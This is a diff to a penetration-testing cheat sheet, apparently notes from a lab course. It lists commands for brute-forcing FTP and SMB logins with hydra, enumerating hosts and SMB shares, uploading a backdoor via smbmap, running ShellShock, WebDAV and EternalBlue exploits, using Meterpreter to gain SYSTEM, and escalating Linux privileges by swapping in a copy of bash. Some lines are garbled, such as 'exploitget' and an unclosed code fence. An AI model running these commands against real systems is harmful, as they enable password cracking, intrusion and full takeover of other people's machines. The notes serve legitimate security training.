@@ -1,12 +1,27 @@
-#Hydra 
+# Hydra 
 
 Attacking un Common ports
 gzip -d /usr/share/wordlists/rockyou.txt.gz
 hydra -L /root/Desktop/wordlists/ftp_Users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://192.253.124.3:5554
 
-#HTTP: 80, 443
+# Network
 
-####Nmap
+```bash
+#Dump IPs withing a Sub Domain
+fping -a -g <IP/NW Mask>
+fping -a -g 10.1.10.0/24
+#show only alive-reachable machines
+fping -a -g 10.1.10.0/24 2>/dev/null
+
+#Ping scan. No port
+nmap -sn <IP>
+nmap -sn <IP> <IP>
+nmap -sn <IPRange-IP>
+```
+
+# HTTP: 80, 443
+
+#### Nmap
 ```bash
 sudo nmap -p 80 -sV -O <TARGET_IP>
 
@@ -16,10 +31,15 @@ nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <T
 nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
 ```
 
-####Alternative
+#### Alternative
 ```bash
+#Shows Server & Sight additional data
 whatweb <TARGET_IP>
+
+#Shows source code. not the rendered one
 http <TARGET_IP>
+
+#Renders page on Ternimal
 browsh --startup-url http://<TARGET_IP>
 
 dirb http://<TARGET_IP>
@@ -60,7 +80,7 @@ set VERBOSE false
 set AUTH_URI /<DIR>/
 exploit
 ```
-####IIS WEBDAV
+#### IIS WEBDAV
 ```bash
 # IIS WEBDAV. Shows directory, file creation and execution of it.
 davtest -url <URL>
@@ -98,10 +118,11 @@ set HttpPassword <PW>
 set PATH /webdav/metasploit.asp
 ```
 
-####ShellShock
+#### ShellShock or CGI
 ```bash
 # BASH - APACHE
 nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
+#nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi" target1.ine.local
 ```
 
 ```bash
@@ -112,17 +133,19 @@ setg RHOST <TARGET_IP>
 
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
 set RHOSTS <TARGET_IP>
+set LHOST <eth1>
 set TARGETURI /gettime.cgi
-exploit
+exploitget
 ```
+
 ####Bruteforce 
 ```bash
 
 ```
 
-#SMB - 445 or 139 (Netbios)
+# SMB - 445 or 139 (Netbios)
 
-####Nmap
+#### Nmap
 ```bash
 sudo nmap -p 445 -sV -sC -O <TARGET_IP>
 nmap -sU --top-ports 25 --open <TARGET_IP>
@@ -157,12 +180,12 @@ nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
 
 ```
 
-####Nmblookup
+#### Nmblookup
 ```bash
 nmblookup -A <TARGET_IP>
 ```
 
-####SMBMap
+#### SMBMap
 ```bash
 smbmap -u guest -p "" -d . -H <TARGET_IP>
 
@@ -180,14 +203,16 @@ smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\s
 smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 ```
 
-####SMBClient
+#### SMBClient
 ```bash
 # Connection
 smbclient -L <TARGET_IP> -N
 smbclient -L <TARGET_IP> -U <USER>
+smbclient -L //target2.ine.local -U administrator
 smbclient //<TARGET_IP>/<USER> -U <USER>
 smbclient //<TARGET_IP>/admin -U admin
 smbclient //<TARGET_IP>/public -N #NULL Session
+
 ## SMBCLIENT
 smbclient //<TARGET_IP>/share_name
 help
@@ -195,7 +220,7 @@ ls
 get <filename>
 ```
 
-####RPCClient
+#### RPCClient
 ```bash
 rpcclient -U "" -N <TARGET_IP>
 ## RPCCLIENT
@@ -204,16 +229,17 @@ enumdomgroups
 lookupnames admin
 ```
 
-####Enum4Linux
+#### Enum4Linux
 ```bash
 enum4linux -o <TARGET_IP>
+enum4linux -i <TARGET_IP>
 enum4linux -U <TARGET_IP>
 enum4linux -S <TARGET_IP>
 enum4linux -G <TARGET_IP>
-enum4linux -i <TARGET_IP>
+enum4linux -U -M -S -P -G <TARGET_IP>
 enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
 enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
-enum4linux -U -M -S -P -G <TARGET_IP>
+
 
 ## NULL SESSIONS
 
@@ -229,7 +255,7 @@ smbclient \\\\<TARGET_IP>\\c$ -N -U ""
 smb: \> get file_shared.txt
 ```
 
-####Hydra
+#### Hydra
 ```bash
 gzip -d /usr/share/wordlists/rockyou.txt.gz
 
@@ -237,7 +263,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
 ```
 We can use a wordlist generator tools (how Cewl), to create custom wordlists.
 
-####Metasploit
+#### Metasploit
 ```bash
 # METASPLOIT Starting
 msfconsole
@@ -271,7 +297,7 @@ set SMBUser <USER>
 set SMBPass <PW>
 ```
 
-####PSEXEC
+#### PSEXEC
 ```bash
 psexec.py <USER>@<TARGET_IP> cmd.exe
 
@@ -296,7 +322,7 @@ chmod +x eternalblue_exploit7.py
 python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
 ```
 
-#SAMBA
+# SAMBA
 
 ```bash
 # SAMBA
@@ -307,6 +333,50 @@ smbclient -L <TARGET_IP> -U <USER>
 enum4linux -a <TARGET_IP>
 enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
 ```
+
+#Meterpreter
+
+```bash
+getuid
+sysinfo
+getprivs
+getsystem
+
+##Windows
+pgrep lsass
+migrate <explorer_PID>
+getprivs
+
+``
+
+# FILE
+
+```bash
+#read contents of text embedded within the binary
+#strings <binary name> in a shell
+strings welcome
+
+```
+
+#Linux Priv Escalation
+
+#### Possibility 1
+Find a executable which links to another file. Try to edit the other file to embed mallicious code to gain root access
+
+```bash
+#find greetings file embedded into welcome executable
+strings welcome
+
+#remove original greetings
+rm greetings
+
+#make a copy of bash and call it greetings
+cp /bin/bash greetings
+
+#execute welcome file
+./welcome
+```
+
 
 
 
